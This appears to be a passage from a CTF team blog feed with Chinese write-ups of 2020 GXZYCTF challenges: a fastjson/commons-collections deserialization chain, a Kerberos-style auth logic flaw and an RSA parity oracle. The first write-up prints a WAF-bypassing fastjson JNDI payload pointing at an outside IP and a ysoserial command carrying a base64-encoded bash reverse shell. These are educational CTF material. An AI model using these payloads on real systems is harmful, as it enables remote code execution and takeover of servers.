class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看到有一个/you_never_know_the_path路径，还有1.2.48fastjson,还有这个commons-collections东东，然后查了下fastjson的最近的漏洞，[这篇](<a href="https://0day.design/2020/01/30/fastjson" target="_blank" rel="noopener">https://0day.design/2020/01/30/fastjson</a> 触发流程分析/)文章具体的分析了漏洞，然后这里就贴出payload，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;\"@<span class="built_in">type</span>\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;</span><br></pre></td></tr></table></figure><p>然后用这个payload打的话，还是会触发waf,</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311143155288.png" alt></p><p>然后测试发现对type和prefix进行了过滤，从上面那篇文章可以知道</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311143500149.png" alt></p><p>那么就可以通过十六进制绕过type的过滤，然后就是prefix的绕过，</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311144231267.png" alt></p><p>然后这里就通过在prefix前面加-来绕过，然后就是在vps上开一个JRMPListener,然后通过fastjson的漏洞触发服务器连接vps的JRMPListener，然后给服务器发送序列化的payload,触发服务器反序列化，最后rce。</p><p>payload：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">java -cp ysoserial<span class="selector-class">.jar</span> ysoserial<span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span>  <span class="number">8888</span> CommonsCollections5 <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNTAwMDAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"@\x74ype"</span>:<span class="string">"org.apache.commons.configuration.JNDIConfiguration"</span>,<span class="string">"-prefix"</span>:<span class="string">"rmi://144.34.200.151:8888/Exploit"</span>&#125;</span><br></pre></td></tr></table></figure><p>成功反弹shell。</p><p><img src="/2020/03/09/2020_GXZYCTF_baby_java/image-20200311145143273.png" alt></p><p>另外还有用在vps上开了一个LDAPServer,来反弹shell，由于java还不是太熟，这里没有复现。</p><p>参考：<a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_baby_java/image-20200311132610679.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;很酷炫，然后比赛就是不会做，burp截包可以看到这里用了xml格式来读取输入的数据，可以xxe，&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Java" scheme="https://boiteam.github.io/categories/Web/Java/"/>
    
    
      <category term="Web_XXE" scheme="https://boiteam.github.io/tags/Web-XXE/"/>
    
      <category term="Web_Java反序列化" scheme="https://boiteam.github.io/tags/Web-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF dooog</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_dooog/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_dooog/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T12:03:57.117Z</updated>
    
    <content type="html"><![CDATA[<p>题目很简单，逻辑捋清楚就行了，</p><a id="more"></a><p>从client出发，先后向kdc的getTGT和getTicket发包校验，校验通过则发包到cmd执行，执行没有回显，主要在getTicket中的判断限制了cmd的内容，不过认真分析一下kdc源码，可以发现data变量是可控的，控制前一数据包中的timestamp使得int(time.time()) - data[‘timestamp’] &gt; 60就可以了，所以修改client app.py</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, flash</span><br><span class="line">from flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line">from form <span class="keyword">import</span> RegisterForm, CmdForm</span><br><span class="line">from toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os, requests, json, time, base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"SECRET_KEY"</span>] = os.urandom(<span class="number">32</span>)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/cmd'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def cmd():</span><br><span class="line">    form = CmdForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            cmd = form.cmd.<span class="keyword">data</span></span><br><span class="line">            print(username,master_key,cmd)</span><br><span class="line">            cryptor = AESCipher(master_key)</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            session[<span class="string">'session_key'</span>], session[<span class="string">'TGT'</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">            flash(<span class="string">'GET TGT DONE'</span>)</span><br><span class="line">            #visit TGS</span><br><span class="line">            cryptor = AESCipher(session[<span class="string">'session_key'</span>])</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: <span class="number">1</span>&#125;))</span><br><span class="line"></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: session[<span class="string">'TGT'</span>]&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'cmd error'</span>:</span><br><span class="line">                flash(<span class="string">'cmd not allow'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            flash(<span class="string">'GET Ticket DONE'</span>)</span><br><span class="line">            client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line">            session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">            cryptor = AESCipher(session_key)</span><br><span class="line">            authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, <span class="keyword">data</span>=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>, flag=res.content)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/register'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def register():</span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/register'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'master_key'</span>: master_key&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'duplicate username'</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">            elif res.content != <span class="string">''</span> :</span><br><span class="line">                session[<span class="string">'id'</span>] = int(res.content)</span><br><span class="line">                flash(<span class="string">'register success'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=False, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>本地起一个服务来发包就行了</p><p><img src="/2020/03/09/2020_GXZYCTF_dooog/0-1583723326867.png" alt="0-1583723326867"></p><p><img src="/2020/03/09/2020_GXZYCTF_dooog/0-1583723345340-1584691884318.png" alt>        </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目很简单，逻辑捋清楚就行了，&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Python" scheme="https://boiteam.github.io/categories/Web/Python/"/>
    
    
      <category term="Web_逻辑漏洞" scheme="https://boiteam.github.io/tags/Web-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF lancet</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_crypto-lancet/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_crypto-lancet/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T12:46:27.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>访问服务器可得e、n，每次访问的值是随机的。服务器上可选加密或者解密两种方式。正常解法应该是构造（c*2）^e % n，返回值除以2便是m。</li><li>但是由于服务器返回的解密结果不全，经验证仅为结果的最后一位。</li><li>通过其返回结果可判断，由于n为奇数，flag最后字符为’}’因此m也为奇数。m乘以任意一个偶数模n肯定为奇数，除非m&gt;n</li><li>因此构造（c<em>（2^i））^e % n 爆破出i，即恰好当（c</em>（2^i））^e % n的返回值为偶数时可得n 约等于m*i</li><li>通过上述方法爆破i可求出flag</li><li>由于比赛时该题没做出来，后来复现时服务器关闭了，现放VN脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> enc</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c)</span>:</span></span><br><span class="line">    fuck = enc(long_to_bytes(c))</span><br><span class="line">    l = len(fuck)</span><br><span class="line">    r.recvuntil(<span class="string">'want here'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'send how long you want to decrypt'</span>)</span><br><span class="line">    r.send(str(l))</span><br><span class="line">    r.recvuntil(<span class="string">'send the message in base64 encode'</span>)</span><br><span class="line">    r.send(fuck)</span><br><span class="line">    res = r.recvline()</span><br><span class="line">    res = r.recvline()</span><br><span class="line">    log.info(res)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'res:1'</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'res:0'</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(n,e,c)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k</span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    c = (c * c_of_2) % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext</span><br><span class="line">        c = (c * c_of_2) % n</span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'121.37.174.33'</span>,<span class="number">9999</span>)</span><br><span class="line">r.recvuntil(<span class="string">'n:'</span>)</span><br><span class="line">n = r.recvuntil(<span class="string">'\ne:'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">n = int(n)</span><br><span class="line">r.recvuntil(<span class="string">'flag:'</span>)</span><br><span class="line">c = r.recvuntil(<span class="string">'\nyou'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">c = int(c)</span><br><span class="line">log.success(hex(n))</span><br><span class="line">log.success(hex(c))</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(partial(n,e,c))</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;访问服务器可得e、n，每次访问的值是随机的。服务器上可选加密或者解密两种方式。正常解法应该是构造（c*2）^e % n，返回值除以2便是m。&lt;/li&gt;
&lt;li&gt;但是由于服务器返回的解密结果不全，经验证仅为结果的最后一位。&lt;/li&gt;
&lt;li&gt;通过其返回结果可判断，由于n为奇数，flag最后字符为’}’因此m也为奇数。m乘以任意一个偶数模n肯定为奇数，除非m&amp;gt;n&lt;/li&gt;
&lt;li&gt;因此构造（c&lt;em&gt;（2^i））^e % n 爆破出i，即恰好当（c&lt;/em&gt;（2^i））^e % n的返回值为偶数时可得n 约等于m*i&lt;/li&gt;
&lt;li&gt;通过上述方法爆破i可求出flag&lt;/li&gt;
&lt;li&gt;由于比赛时该题没做出来，后来复现时服务器关闭了，现放VN脚本&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; base64 &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; b64encode &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; enc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; decimal&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;oracle&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(c)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fuck = enc(long_to_bytes(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    l = len(fuck)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;want here&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.sendline(&lt;span class=&quot;string&quot;&gt;&#39;2&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;send how long you want to 